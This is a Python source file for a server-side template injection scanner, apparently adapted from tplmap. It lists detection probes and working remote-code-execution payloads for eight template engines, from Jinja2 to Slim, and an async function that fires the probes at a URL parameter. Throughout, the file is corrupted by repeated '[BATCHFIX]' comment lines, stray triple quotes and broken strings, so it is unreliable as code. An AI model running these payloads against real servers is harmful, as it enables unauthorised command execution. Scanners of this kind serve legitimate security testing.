#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import aiohttp
import re
from typing import Dict, List, Any, cast

# Ported and enhanced from tplmap engines and common SSTI research
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
""" SSTI_ENGINE_SIGNATURES: Dict[str, Dict[str, Any]] = {""""    "jinja2": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],"'# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49|7777777","  # [BATCHFIX] closed string"        "description": "Python based template engine","        "rce_payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}","'    },
    "twig": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],"'# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49|7777777","  # [BATCHFIX] closed string"        "description": "PHP based template engine","        "rce_payload": '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',"'    },
    "smarty": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["{7*7}"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "PHP based template engine","        "rce_payload": "{system('id')}","'    },
    "mako": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["${7*7}"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Python based template engine","        "rce_payload": "${__import__('os').popen('id').read()}","'    },
    "tornado": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["{{7*7}}"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Python based web framework engine","        "rce_payload": "{{ import os; os.popen('id').read() }}","'    },
    "velocity": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["#set($x=7*7)$x"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Java based template engine","# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""
#         "rce_payload": ("            '#set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").getInputStream())'"'# [BATCHFIX] Commented metadata/non-Python
"""             "#foreach($i in [1..$str.available()])$str.read()#end"  # [BATCHFIX] closed string"        ),
    },
    "freemarker": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["${7*7}"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Java based template engine","        "rce_payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',"'    },
    "erb": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["<%= 7*7 %>"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Ruby based template engine","        "rce_payload": "<%= `id` %>","    },
    "slim": {"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         "detection_payloads": ["#{7*7}"],"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""
#         "verification_regex": r49","  # [BATCHFIX] closed string"        "description": "Ruby based template engine","        "rce_payload": "#{`id`}","    },
}


# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
""" async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:""""
#     Detects Server Side Template Injection in a specific URL parameter.
# [BATCHFIX] Commented metadata/non-Python
"""     detected_engines =" []"  # [BATCHFIX] closed string"    timeout = aiohttp.ClientTimeout(total=5)

    for engine, data in SSTI_ENGINE_SIGNATURES.items():
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""         for payload in data["detection_payloads"]:"            params = {parameter: payload}
            try:
                async with session.get(url, params=params, timeout=timeout) as response:
                    text = await response.text()
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""                     pattern = cast(str, data["verification_regex"])"                    if re.search(pattern, text):
                        # Potential match, try second payload if available to confirm
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""                         if len(data["detection_payloads"]) > 1:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""                             second_payload = data["detection_payloads"][1]"                            async with session.get(url, params={parameter: second_payload}, timeout=timeout) as resp2:
                                text2 = await resp2.text()
                                if re.search(pattern, text2):
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""
#                                     detected_engines.append(
                                        {
                                            "engine": engine,"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""                                             "description": data["description"],"                                            "payload": payload,"                                            "parameter": parameter,"                                        }
                                    )
                                    break
                        else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""
#                             detected_engines.append(
                                {
                                    "engine": engine,"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""
# [BATCHFIX] Commented metadata/non-Python
"""                                     "description": data["description"],"                                    "payload": payload,"                                    "parameter": parameter,"                                }
                            )
                            break
            except Exception:
                continue

    return detected_engines


if __name__ == "__main__":"    # Example usage logic
    pass
